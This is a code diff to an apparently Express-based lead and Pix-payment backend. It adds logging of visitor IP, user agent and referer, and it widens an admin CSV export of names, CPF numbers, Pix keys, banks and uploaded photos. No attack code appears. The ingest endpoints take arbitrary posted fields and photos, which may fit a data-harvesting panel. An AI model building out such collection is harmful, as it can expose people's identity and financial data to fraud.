@@ -82,6 +82,20 @@ function visitorId(req) {
   return String(req.body.visitorId || req.body.visitor_id || '').slice(0, 80);
 }
 
+function clientIp(req) {
+  const forwarded = req.headers['x-forwarded-for'];
+  const raw = forwarded ? String(forwarded).split(',')[0] : (req.headers['x-real-ip'] || req.ip || '');
+  return String(raw).trim().replace(/^::ffff:/, '').slice(0, 64);
+}
+
+function clientMeta(req) {
+  return {
+    ip: clientIp(req),
+    userAgent: String(req.headers['user-agent'] || '').slice(0, 300),
+    referer: String(req.headers.referer || req.headers.referrer || '').slice(0, 300),
+  };
+}
+
 function publicBase(req) {
   if (PUBLIC_URL) return PUBLIC_URL;
   const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
@@ -105,8 +119,9 @@ app.post('/api/pix/create', async (req, res) => {
       customer,
       tracking: req.body.tracking || {},
       webhookUrl: `${publicBase(req)}/api/pix/webhook`,
-      ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
+      ip: clientIp(req),
     });
+    const meta = clientMeta(req);
     await store.savePix({
       visitorId: visitorId(req),
       cpf: customer.document,
@@ -119,10 +134,14 @@ app.post('/api/pix/create', async (req, res) => {
       qrCode: charge.qrCode,
       amount: charge.amount,
       status: charge.status,
+      ip: meta.ip,
+      userAgent: meta.userAgent,
+      referer: meta.referer,
     });
     await store.upsertLead({
       visitorId: visitorId(req) || undefined,
       step: req.body.product || 'pix',
+      meta,
       fields: {
         nome: customer.name,
         email: customer.email,
@@ -244,6 +263,7 @@ app.post('/api/ingest/lead', async (req, res) => {
     const lead = await store.upsertLead({
       visitorId: visitorId(req) || undefined,
       step: req.body.step,
+      meta: clientMeta(req),
       fields: req.body.fields || req.body,
     });
     res.json({ ok: true, id: lead.id });
@@ -256,7 +276,7 @@ app.post('/api/ingest/photo', async (req, res) => {
   try {
     const vid = visitorId(req);
     if (!vid) return res.status(400).json({ error: 'visitorId obrigatório' });
-    const saved = await store.savePhoto(vid, req.body.image || req.body.dataUrl);
+    const saved = await store.savePhoto(vid, req.body.image || req.body.dataUrl, clientMeta(req));
     res.json({ ok: true, ...saved });
   } catch (err) {
     res.status(400).json({ error: err.message || 'Falha ao salvar foto' });
@@ -270,6 +290,7 @@ app.post('/api/ingest/pix', async (req, res) => {
       try { requestBody = JSON.parse(requestBody); } catch { requestBody = {}; }
     }
     const response = req.body.response || {};
+    const meta = clientMeta(req);
     const rec = await store.savePix({
       visitorId: visitorId(req),
       cpf: (requestBody && (requestBody.document || requestBody.cpf)) || req.body.cpf,
@@ -280,11 +301,15 @@ app.post('/api/ingest/pix', async (req, res) => {
       qrCode: req.body.qrCode || response.qrCode || response.qr_code || response.copyPaste,
       amount: req.body.amount || response.amount,
       status: req.body.status || response.status || 'pending',
+      ip: meta.ip,
+      userAgent: meta.userAgent,
+      referer: meta.referer,
     });
     if (requestBody && (requestBody.name || requestBody.email || requestBody.document)) {
       await store.upsertLead({
         visitorId: visitorId(req),
         step: req.body.page || 'pix',
+        meta,
         fields: {
           nome: requestBody.name,
           email: requestBody.email,
@@ -350,7 +375,7 @@ app.post('/api/admin/gateway', requireAdmin, async (req, res) => {
 });
 
 app.get('/api/admin/leads', requireAdmin, (req, res) => {
-  res.json(store.listLeads(req.query.q));
+  res.json(store.listLeads(req.query.q, req.query.status));
 });
 
 app.get('/api/admin/leads/:id', requireAdmin, (req, res) => {
@@ -367,7 +392,7 @@ app.get('/api/admin/leads/:id/photos/:file', requireAdmin, (req, res) => {
 
 app.get('/api/admin/export.csv', requireAdmin, (req, res) => {
   const rows = store.listLeads('');
-  const headers = ['id', 'createdAt', 'nome', 'cpf', 'email', 'telefone', 'chavePix', 'banco', 'valor', 'step'];
+  const headers = ['id', 'createdAt', 'nome', 'cpf', 'email', 'telefone', 'ip', 'userAgent', 'chavePix', 'banco', 'valor', 'utmSource', 'utmCampaign', 'step', 'status'];
   const csv = [headers.join(',')].concat(rows.map((r) => headers.map((h) => {
     const val = String(r[h] || '').replace(/"/g, '""');
     return `"${val}"`;
